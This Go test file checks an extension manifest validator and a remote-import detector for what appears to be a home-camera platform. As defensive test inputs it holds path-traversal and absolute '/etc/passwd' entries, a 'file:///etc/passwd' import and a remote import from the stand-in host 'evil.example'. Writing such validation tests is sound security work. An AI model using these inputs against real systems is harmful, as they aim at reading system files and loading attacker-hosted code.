package ext

import (
	"reflect"
	"strings"
	"testing"
)

const haLights = `{
  "manifest": 1,
  "id": "com.example.ha-room-lights",
  "name": "Home Assistant Room Lights",
  "version": "1.2.0",
  "author": "Jane Doe",
  "description": "Adds a camera-view panel and turns on the room's lights.",
  "minApiVersion": "v1",
  "permissions": {
    "data": { "cameras": "read", "events": "read" },
    "cameras": ["hallway", "front-door"],
    "network": ["https://homeassistant.local:8123"],
    "storage": true
  },
  "ui": { "panels": [ { "slot": "camera-detail", "entry": "ui/panel.html", "title": "Room Lights" } ] },
  "backend": { "entry": "backend/main.ts", "denoVersion": "2" },
  "update": { "url": "https://example.com/ha-room-lights/manifest.json" }
}`

func TestManifestHALightsResolves(t *testing.T) {
	m, err := Parse([]byte(haLights))
	if err != nil {
		t.Fatalf("parse: %v", err)
	}
	d, err := m.Validate()
	if err != nil {
		t.Fatalf("validate: %v", err)
	}
	if !d.HasUI || !d.HasBackend {
		t.Fatalf("HasUI/HasBackend = %v/%v, want true/true", d.HasUI, d.HasBackend)
	}
	if want := []string{"cameras:read", "events:read"}; !reflect.DeepEqual(d.Scopes, want) {
		t.Fatalf("scopes = %v, want %v", d.Scopes, want)
	}
	if want := []string{"hallway", "front-door"}; !reflect.DeepEqual(d.CameraGrants, want) {
		t.Fatalf("cameraGrants = %v, want %v", d.CameraGrants, want)
	}
	if want := []string{"homeassistant.local:8123"}; !reflect.DeepEqual(d.NetHosts, want) {
		t.Fatalf("netHosts = %v, want %v (scheme stripped, port kept)", d.NetHosts, want)
	}
	// Consent names the cameras and warns about outbound.
	joined := strings.Join(d.ConsentLines, "\n")
	for _, must := range []string{"hallway", "front-door", "homeassistant.local:8123", "cannot read your recordings"} {
		if !strings.Contains(joined, must) {
			t.Errorf("consent missing %q in:\n%s", must, joined)
		}
	}
}

func TestManifestWriteImpliesRead(t *testing.T) {
	m, _ := Parse([]byte(`{"manifest":1,"id":"a.b","name":"N","version":"1.0.0","backend":{"entry":"m.ts"},"permissions":{"data":{"detection":"write"}}}`))
	d, err := m.Validate()
	if err != nil {
		t.Fatal(err)
	}
	if want := []string{"detection:read", "detection:write"}; !reflect.DeepEqual(d.Scopes, want) {
		t.Fatalf("write should imply read: %v, want %v", d.Scopes, want)
	}
}

func TestManifestRejections(t *testing.T) {
	cases := map[string]string{
		"unknown top-level field (strict)": `{"manifest":1,"id":"a.b","name":"N","version":"1.0.0","backend":{"entry":"m.ts"},"bogus":1}`,
		"wrong manifest version":           `{"manifest":9,"id":"a.b","name":"N","version":"1.0.0","backend":{"entry":"m.ts"}}`,
		"bad id (not reverse-DNS)":         `{"manifest":1,"id":"notdns","name":"N","version":"1.0.0","backend":{"entry":"m.ts"}}`,
		"bad version":                      `{"manifest":1,"id":"a.b","name":"N","version":"1.x","backend":{"entry":"m.ts"}}`,
		"no ui and no backend":             `{"manifest":1,"id":"a.b","name":"N","version":"1.0.0"}`,
		"unknown data domain":              `{"manifest":1,"id":"a.b","name":"N","version":"1.0.0","backend":{"entry":"m.ts"},"permissions":{"data":{"nope":"read"}}}`,
		"un-grantable value (coverage write)": `{"manifest":1,"id":"a.b","name":"N","version":"1.0.0","backend":{"entry":"m.ts"},"permissions":{"data":{"coverage":"write"}}}`,
		"bad alarm value":                  `{"manifest":1,"id":"a.b","name":"N","version":"1.0.0","backend":{"entry":"m.ts"},"permissions":{"alarm":"disarm"}}`,
		"network without backend":          `{"manifest":1,"id":"a.b","name":"N","version":"1.0.0","ui":{"panels":[{"slot":"settings","entry":"ui/x.html"}]},"permissions":{"network":["https://x.test"]}}`,
		"bad network url":                  `{"manifest":1,"id":"a.b","name":"N","version":"1.0.0","backend":{"entry":"m.ts"},"permissions":{"network":["not a url"]}}`,
		"unknown ui slot":                  `{"manifest":1,"id":"a.b","name":"N","version":"1.0.0","ui":{"panels":[{"slot":"nope","entry":"ui/x.html"}]}}`,
		"entry path traversal":             `{"manifest":1,"id":"a.b","name":"N","version":"1.0.0","backend":{"entry":"../escape.ts"}}`,
		"entry absolute path":              `{"manifest":1,"id":"a.b","name":"N","version":"1.0.0","backend":{"entry":"/etc/passwd"}}`,
	}
	for name, src := range cases {
		t.Run(name, func(t *testing.T) {
			m, err := Parse([]byte(src))
			if err != nil {
				return // rejected at parse — acceptable (e.g. strict/version)
			}
			if _, err := m.Validate(); err == nil {
				t.Fatalf("expected rejection, got none")
			}
		})
	}
}

func TestCheckNoRemoteImports(t *testing.T) {
	bad := "import { x } from \"https://evil.example/mod.ts\";\nimport { aperture } from \"@aperture/sdk\";"
	got := CheckNoRemoteImports(bad)
	if len(got) != 1 || got[0] != "https://evil.example/mod.ts" {
		t.Fatalf("remote import detection = %v, want [https://evil.example/mod.ts]", got)
	}
	if extra := CheckNoRemoteImports(`import { aperture } from "@aperture/sdk";\nconst d = await import("./local.ts");`); len(extra) != 0 {
		t.Fatalf("bare + relative imports should be clean, got %v", extra)
	}
	if fileScheme := CheckNoRemoteImports(`import x from "file:///etc/passwd";`); len(fileScheme) != 1 {
		t.Fatalf("file: scheme should be rejected, got %v", fileScheme)
	}
}
